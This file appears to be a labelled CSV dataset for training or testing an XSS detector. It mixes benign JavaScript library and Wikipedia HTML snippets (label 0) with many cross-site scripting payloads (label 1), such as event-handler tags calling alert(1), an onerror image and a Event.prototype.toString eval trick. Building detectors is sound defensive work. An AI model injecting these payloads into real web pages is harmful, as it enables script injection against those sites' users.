payload,label
"<kbd onmouseleave=""alert(1)"">test</kbd>",1
"'<div class=""timepicker-span-am-pm""></div>', '</div>', '</div>',",0
<source onpointermove=alert(1)>xss</source>,1
if (ishours) { if (value === 0) value = 12; } else {,0
let taptargetwrappercssobj = {}; taptargetwrappercssobj.top = istop ? taptargettop + 'px' : ''; taptargetwrappercssobj.right = isright,0
this._animateoverlayout(),0
values.push(firstdisabled.text()); } },0
"<ul onmouseout=""alert(1)"">test</ul>",1
if (!title) { return; },0
"const elementmap = new map() export default { set(element, key, instance) {",0
"key: ""init"", value: function init(els, options) { return _get(chips.__proto__ || object.getprototypeof(chips), ""init"", this).call(this, this, els, options);",0
const event_hide$3 = `hide${event_key$3}`,0
"trigger: function (eventname, data) { if (document.createevent) { let evt = document.createevent('htmlevents');",0
this.cancelbtn.innerhtml = this.options.i18n.cancel,0
"boundary: this._config.boundary } },",0
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",1
var footeroffset = $('body > footer').first().length,0
_setupstyles() { this.$img[0].style.opacity = 1; },0
const instance = dropdown.getorcreateinstance(gettogglebutton); if (isupordownevent) { event.stoppropagation();,0
}); } this.$el.after(this.dropdownoptions);,0
"} static _getdaysinmonth(year, month) { return [31, datepicker._isleapyear(year) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][",0
"}); eventhandler.on(window, event_load_data_api, () => { const carousels = selectorengine.find(selector_data_ride);",0
"<form action=""/w/index.php"" id=""searchform"">",0
return `.${this.data_key}`; } static eventname(name) {,0
<menuitem onfocusout=alert(1) tabindex=1 id=x></menuitem><input autofocus>,1
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",1
<svg><li onload=alert(1)></li>,1
value: function _appendtooltipel() { var tooltipel = document.createelement('div'); tooltipel.classlist.add('material-tooltip');,0
"<p class=""mw-empty-elt"">",0
<svg><xmp onload=alert(1)></xmp>,1
<svg><datalist onload=alert(1)></datalist>,1
} this._setselectedstates(); },0
"<th onmouseenter=""alert(1)"">test</th>",1
if (value === number(value).tostring()) { return number(value); },0
"<style>@keyframes slidein {}</style><datalist style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></datalist>",1
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",1
"type=""text/x-scriptlet"" data=""http://.rocks/scriptlet.html",1
"<li class=""toclevel-3 tocsection-61""><a href=""#consciousness""><span class=""tocnumber"">8.4.1",0
"inner = ishours && z < (this.options.outerradius + this.options.innerradius) / 2, radius = inner ? this.options.innerradius : this.options.outerradius; if (this.options.twelvehour) {",0
<noembed onpointerdown=alert(1)>xss</noembed>,1
"<style>:target {color:red;}</style><wbr id=x style=""transition:color 1s"" ontransitionend=alert(1)></wbr>",1
"const selectorengine = { find(selector, element = document.documentelement) { return [].concat(...element.prototype.queryselectorall.call(element, selector))",0
<sub onpointerup=alert(1)>xss</sub>,1
"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",1
scope_events[namespacedevent].push(callback),0
"<noembed onbeforepaste=""alert(1)"" contenteditable>test</noembed>",1
} renderbody(rows) { return '<tbody>' + rows.join('') + '</tbody>';,0
"echo('ipt>alert("""")</script>')",1
"getnextactiveelement(items, target, key === arrow_down_key$1, !items.includes(target)).focus(); } static jqueryinterface(config) {",0
"<applet onmouseleave=""alert(1)"">test</applet>",1
<base id=x tabindex=1 onfocusin=alert(1)></base>,1
var disabledclass = option.disabled ? 'disabled ' : '',0
"<dfn onbeforepaste=""alert(1)"" contenteditable>test</dfn>",1
<button id=x tabindex=1 onbeforeactivate=alert(1)></button>,1
this.spanminutes.innerhtml = timepicker._addleadingzero(this.minutes); this._updateampmview(); },0
"scrollparent.addeventlistener('scroll', instance.update, passive)",0
if (this.showindicators) { this.$el.find('.carousel-fixed-item').addclass('with-indicators'); },0
"<footer onbeforecopy=""alert(1)"" contenteditable>test</footer>",1
"<form oncut=""alert(1)"" contenteditable>test</form>",1
} return isend ? placement_bottomend : placement_bottom },0
"<li><cite id=""citereftecuci2012"" class=""citation journal"">tecuci, gheorghe (march–april 2012). ""artificial intelligence"". <i>wiley interdisciplinary reviews: computational statistics </i>. <b>4 </b> (2): 168–180. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1002%2fwics.200"">10.1002/wics.200 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=wiley+interdisciplinary+reviews%3a+computational+statistics&amp;rft.atitle=artificial+intelligence&amp;rft.volume=4&amp;rft.issue=2&amp;rft.pages=168-180&amp;rft.date=2012-03%2f2012-04&amp;rft_id=info%3adoi%2f10.1002%2fwics.200&amp;rft.aulast=tecuci&amp;rft.aufirst=gheorghe&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
if (opts.showdaysinnextandpreviousmonths) { arr.push('is-outside-current-month'); arr.push('is-selection-disabled');,0
const parentdropdown = this._parent,0
"<xmp onmouseover=""alert(1)"">test</xmp>",1
"let day = new date(year, month, 1 + (i - before)), isselected = datepicker._isdate(this.date) ? datepicker._comparedates(day, this.date)",0
"<li><a href=""#citerefmccorduck2004"">mccorduck 2004 </a>, p.&#160;153 </li>",0
"<dfn onkeypress=""alert(1)"" contenteditable>test</dfn>",1
"this.el.m_scrollspy = undefined; } }, {",0
"<style>:target {color:red;}</style><map id=x style=""transition:color 1s"" ontransitionend=alert(1)></map>",1
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",1
"src: ['index.html', 'license'], dest: 'starter-template/' },",0
e)}function t(b){if(!(this instanceof t))return new t(b),0
} _handlefabclick() { if (this.isopen) {,0
"<li><a href=""/wiki/mccarthy_formalism"" title=""mccarthy formalism"">mccarthy formalism </a> </li>",0
"<tfoot onpaste=""alert(1)"" contenteditable>test</tfoot>",1
"<figcaption onmouseup=""alert(1)"">test</figcaption>",1
"document.getelementbyid('selecttoastplacement').addeventlistener('change', function () { if (!toastplacement.dataset.originalclass) { toastplacement.dataset.originalclass = toastplacement.classname",0
"<q onmouseout=""alert(1)"">test</q>",1
"}, { key: ""_handleoverlayclick"", value: function _handleoverlayclick() {",0
<html id=x tabindex=1 onfocus=alert(1)></html>,1
<details id=x tabindex=1 onfocusin=alert(1)></details>,1
"data.push(this.renderrow(row, opts.isrtl, isweekselected))",0
"const selector_dialog = '.modal-dialog' const selector_modal_body = '.modal-body' const selector_data_toggle = '[data-bs-toggle=""modal""]'",0
_handlemodalcloseclick(e) {,0
<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>,1
var $card = $(e.target).closest('.card'); if ($card.data('initialoverflow') === undefined) { $card.data(,0
"<ul><li><a href=""/w/index.php?title=grey_wolf_optimizer&amp;action=edit&amp;redlink=1"" class=""new"" title=""grey wolf optimizer (page does not exist)"">grey wolf optimizer </a> </li>",0
"<img ondblclick=""alert(1)"">test</img>",1
"<style>@keyframes x{}</style><em style=""animation-name:x"" onanimationend=""alert(1)""></em>",1
"<script onmousedown=""alert(1)"">test</script>",1
if ($card.data('initialoverflow') === undefined) {,0
"} if ($(closestoverflowparent).css('position') === 'static') $(closestoverflowparent).css('position', 'relative');",0
"this.el.addeventlistener('touchleave', this._handlerangeblurmouseouttouchleavebound)",0
"<dialog oncontextmenu=""alert(1)"">test</dialog>",1
"api.addfiles([ 'dist/js/materialize.js' ], 'client');",0
"<rp onmouseup=""alert(1)"">test</rp>",1
"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",1
</span></a></dt><dd>see all available signals and how to work with them.</dd>,0
if (opts.isinrange) { arr.push('is-inrange'); },0
defaultprevented = jqueryevent.isdefaultprevented(),0
"<datalist onmouseup=""alert(1)"">test</datalist>",1
"}); window.index.add({ href: 'http://materializecss.com/dropdown.html',",0
"var overflowoffsets = { top: clippingclientrect.top - elementclientrect.top + paddingobject.top, bottom: elementclientrect.bottom - clippingclientrect.bottom + paddingobject.bottom,",0
"scope_values.map(options.format.to),",0
"var throttledresize = m.throttle(this._handlewindowscroll, 200)",0
<rt id=x tabindex=1 onactivate=alert(1)></rt>,1
.removeclass('timepicker-dial-out'); this.resetclock(delay); cleartimeout(this.toggleviewtimer);,0
"<th oncontextmenu=""alert(1)"">test</th>",1
<slot onpointermove=alert(1)>xss</slot>,1
"<h1 onpaste=""alert(1)"" contenteditable>test</h1>",1
const data_key$5 = 'bs.focustrap',0
"<style>@keyframes x{}</style><th style=""animation-name:x"" onanimationend=""alert(1)""></th>",1
"<del onmouseenter=""alert(1)"">test</del>",1
"<figure draggable=""true"" ondragleave=""alert(1)"">test</figure>",1
return config; } static getinstance(element) {,0
this.dropdown.recalculatedimensions(),0
if (args[i].hasownproperty(key)) {,0
} nextwhenvisible() { if (!document.hidden && isvisible(this._element)) {,0
"<option onbeforecopy=""alert(1)"" contenteditable>test</option>",1
this.$active = $(this.container).children('li').eq(this.activeindex),0
"<tr onmouseout=""alert(1)"">test</tr>",1
"} this._setinitialattributes(this._parent, this._getchildren()) eventhandler.on(this._element, event_keydown, event => this._keydown(event))",0
"<fieldset onmousedown=""alert(1)"">test</fieldset>",1
"if (handler.oneoff) { eventhandler.off(element, event.type, selector, fn); }",0
"if (!isnan(year)) { this.calendars[0].year = parseint(year, 10); this.adjustcalendars();",0
"var popperaltoverflow = detectoverflow(state, { altboundary: true });",0
"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",1
"<frame onmousedown=""alert(1)"">test</frame>",1
"<li id=""cite_note-138""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-138"">^ </a> </b>",0
"fn = _state$orderedmodifie.fn,",0
"<footer draggable=""true"" ondragstart=""alert(1)"">test</footer>",1
"return this._config.sanitize ? sanitizehtml(arg, this._config.allowlist, this._config.sanitizefn) : arg; } _resolvepossiblefunction(arg) {",0
reference: 'toggle' } const defaulttype = {,0
"<img src=/ onerror=""alert(string.fromcharcode(88,83,83))""></img>",1
if (placement === left || (placement === top || placement === bottom) && variation === end) {,0
state.scrollparents = {,0
var values = asarray(input),0
<small onpointerover=alert(1)>xss</small>,1
"return selector ? selectorengine.findone(selector) : null }, getmultipleelementsfromselector(element) {",0
"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>",1
"this.$overlay[0].addeventlistener('click', this._handleoverlayclickbound); this.el.addeventlistener('click', this._handlemodalcloseclickbound); }",0
"let throttledresize = m.throttle(this._handleresize, 200)",0
trapelement.focus() } else if (this._lasttabnavdirection === tab_nav_backward) { elements[elements.length - 1].focus(),0
"var preventedoffset = within(tether ? min(min$1, tethermin) : min$1, offset, tether ? max(max$1, tethermax) : max$1)",0
"opacity: 1, scale: [0.4, 1], translatey: [this.offsety, 0],",0
"'sass/components/_timepicker.scss', 'sass/components/_toast.scss', 'sass/components/_tooltip.scss',",0
"<ul><li><a href=""#citerefdreyfus1972"">dreyfus 1972 </a>, <a href=""#citerefdreyfusdreyfus1986"">dreyfus &amp; dreyfus 1986 </a> </li>",0
return false; } var relativex = ripple.getattribute('data-x');,0
<script>onpageswap=settimeout;location='x';event.prototype.tostring=evalerror.prototype.tostring;event.prototype.name='alert\x281\x29'</script>,1
if (!this.ismultiple) { collection.find('li.selected').removeclass('selected'); },0
"var element = getwaveseffectelement(e); if (element !== null) { effect.show(e, element);",0
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,1
let ins = classdef.getinstance(el),0
$('.collapsible').collapsible(); $('.collapsible.expandable').collapsible({ accordion: false,0
"throw new error(""nouislider: 'padding' option must be less than half the range."")",0
"eventhandler.on(document, event_click_data_api, selector_data_toggle, event => { event.preventdefault(); const button = event.target.closest(selector_data_toggle);",0
scrollspy._count--; this._removeeventhandlers(); $(this.options.getactiveelement(this.$el.attr('id'))).removeclass(this.options.activeclass);,0
"<dialog draggable=""true"" ondrag=""alert(1)"">test</dialog>",1
value: function _setupfixed() {,0
"<li><a href=""#citerefpoolemackworthgoebel1998"">poole, mackworth &amp; goebel 1998 </a>, pp.&#160;345–395, </li>",0
"<svg draggable=""true"" ondragstart=""alert(1)"">test</svg>",1
"title: 'grid', body: 'we are using a standard 12 column fluid responsive grid system. the grid helps you layout your page in an ordered, easy fashion.' });",0
"delay: this.options.duration,",0
this.ismultiple = this.$el.prop('multiple'),0
"}, { key: ""_dragmoveupdate"", value: function _dragmoveupdate(e) {",0
<image2 onpointerenter=alert(1)>xss</image2>,1
if (value !== null) {,0
} pageoffset = pageoffset || getpageoffset(); if ( mouse || pointer ) {,0
<figure onpointerover=alert(1)>xss</figure>,1
"<li id=""cite_note-fuzzy_logic-201""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-fuzzy_logic_201-0"">^ </a> </b>",0
<dl onpointerup=alert(1)>xss</dl>,1
"} getnextactiveelement(items, target, key === arrow_down_key, !items.includes(target)).focus() }",0
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,1
"this._observablesections.set(anchor.hash, observablesection) } }",0
<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>,1
this._createdragtarget(); this._setupeventhandlers(); this._setupclasses();,0
<b onpointerleave=alert(1)>xss</b>,1
"<plaintext draggable=""true"" ondragstart=""alert(1)"">test</plaintext>",1
"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",1
} _isanimated() { return this._element.classlist.contains(class_name_slide);,0
"<spacer onmouseleave=""alert(1)"">test</spacer>",1
relativex = e.touches[0].pagex - pos.left,0
var $collapsiblelis = this.$el.children('li'),0
"prev(element, selector) { let previous = element.previouselementsibling; while (previous) {",0
